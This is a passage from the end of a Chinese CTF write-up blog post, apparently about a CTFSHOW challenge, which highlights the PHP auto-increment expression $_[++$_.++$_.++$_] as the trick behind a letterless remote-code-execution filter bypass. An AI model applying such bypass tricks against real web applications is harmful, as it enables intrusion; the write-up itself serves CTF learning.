<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668960029716-156b539e-40f8-497c-a2a2-721396100f6f.png#averageHue=%23fdfdfc&clientId=ub60d4471-e3e1-4&from=paste&height=246&id=u19a1320b&name=image.png&originHeight=307&originWidth=1267&originalType=binary&ratio=1&rotation=0&showTitle=false&size=38279&status=done&style=none&taskId=u0bdb74c6-4008-4d3e-a655-641d8491b66&title=&width=1013.6" alt="image.png"><br>这里的精髓就是<code>$_[++$_.++$_.++$_]</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668959949323-aec10254-dfed-4b61-a2c0-b4f52bc0f00f.png#averageHue=%23fdfdfd&clientId=ub60d4471-e3e1-4&from=paste&height=122&id=zFIc2&name=image.png&originHeight=152&originWidth=657&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7376&status=done&style=none&taskId=u17c7d153-dfce-41ad-88d2-b69fa3fca45&title=&width=525.6" alt="image.png"><br>这边数组内用自增，他的本体也会变成自增后的结果，太逆天了大神</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这周的大挑战就到此为止了，一分钱没瓜分到，难受，因为在做别的<br>总的来说感觉RCE的套路是骚的不能再骚了，自增的魅力无穷</p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/WriteUp/" class="tag">#WriteUp</a><a href="/tags/CTFSHOW/" class="tag">#CTFSHOW</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/03/02/CTFSHOW-%E8%8F%9C%E7%8B%97%E6%9D%AF/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">CTFSHOW-菜狗杯</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/03/02/%E9%95%BF%E5%AE%89%E6%9D%AF2021-WP/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">长安杯2021-WP</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2025 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>